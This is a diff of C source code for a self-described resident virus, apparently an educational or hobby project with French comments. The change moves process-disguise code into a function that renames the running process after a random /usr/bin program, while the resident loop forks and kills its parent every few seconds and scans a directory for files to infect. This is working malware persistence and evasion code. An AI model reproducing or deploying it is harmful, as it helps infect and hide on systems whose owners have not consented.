@@ -71,12 +71,22 @@ _Bool infecter(char fichier[256], int ligne){
 	return 0;
 }
 
-//On scanne le chemin et on cherche les fichiers cibles pour les marquer. Un fork est réalisé chaque seconde
-void resident(){
-	int i=1,nb,nb2;
+void changer_nom(){
+	int nb;
 	struct dirent **liste;
 	int nombre=scandir("/usr/bin",&liste,0,alphasort);
 	char nom_prgm[64];
+	nb=rand()%nombre;
+	strcpy(nom_prgm,liste[nb]->d_name);
+	strcat(nom_prgm,"2");
+	printf("Nouvelle couverture du virus résident: %s\n",nom_prgm);
+	prctl(PR_SET_NAME, nom_prgm, NULL, NULL, NULL);
+
+}
+
+//On scanne le chemin et on cherche les fichiers cibles pour les marquer. Un fork est réalisé chaque seconde
+void resident(){
+	int i=1;
 	while(i>0){
 		sleep(1);
 		fflush(stdout);
@@ -84,11 +94,7 @@ void resident(){
 		if(i%3==0){ //Toutes les trois secondes
 			if(fork()!=0)
 				kill(getpid(),SIGKILL);
-			nb=rand()%nombre;
-			strcpy(nom_prgm,liste[nb]->d_name);
-			strcat(nom_prgm,"2");
-			printf("Nouvelle couverture du virus résident: %s\n",nom_prgm);
-			prctl(PR_SET_NAME, nom_prgm, NULL, NULL, NULL);
+			changer_nom();
 			struct dirent **liste2;
 			struct stat sb;
 			int nb2=scandir(chemin,&liste2,0,alphasort);
